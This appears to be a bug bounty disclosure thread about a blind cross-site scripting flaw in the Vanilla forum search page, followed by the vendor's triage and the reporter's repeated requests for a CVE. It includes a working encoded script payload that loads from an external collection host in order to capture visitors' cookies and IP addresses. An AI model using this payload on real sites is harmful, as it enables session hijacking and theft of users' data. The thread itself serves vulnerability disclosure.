title: BlIND XSS on https://open.vanillaforums.com

profile.name: Vanilla
profile.about: Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community.

vulnerability_information:
Hello sir My name is Mohit Kumar and i'm a security researcher
i found a bug in your website knows as Blind xss


 just open this link -- https://open.vanillaforums.com/search?Search=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fhackerookie.xss.ht%3E%3C%2Fscript%3E ---
i will recieve your cookies and ip too

## Impact

Hacker can get cookies of anyone

activities.message:
Steps to Reproduce---
create xsshunter account
select first payload
then click on new discussion on your website
post that payload there

We have failed to reproduce the reported issue.  Please provide and relevant scripts and information.  Also please provide an POC video (performed on a local environment).  If you perform any more test on an actually site you will be barred from the program.

i created a video poc too 
please follow it step by step
Howdy, thanks for submitting this issue. This has been triaged as a legitimate exploit by a developer on our team and we'll prepare a patch as a soon as possible.

We sincerely appreciate you responsibly disclosing this report to us. However, in the future, please refrain from using sites hosted on our infrastructure for testing purposes. We would prefer you download the open-source software from the public GItHub repository (https://github.com/vanilla/vanilla) and test it in your own environment.

Thanks again!
Here sir i report same bug twice but you guys reported as duplicate

Hello sir @initvector 

Few days back i fond the same bug on community.bidefender.com  they have their own program on bugcrowd and i reported them but they told me that their community page is handled by you so i have to report you

Hello sir @initvector 
Sir please provide CVE number for this vulnerability

Hello @manwithnoname @initvector 
Please issue the CVE number

Hello sir @mcrouse 
can you please issue the CVE number
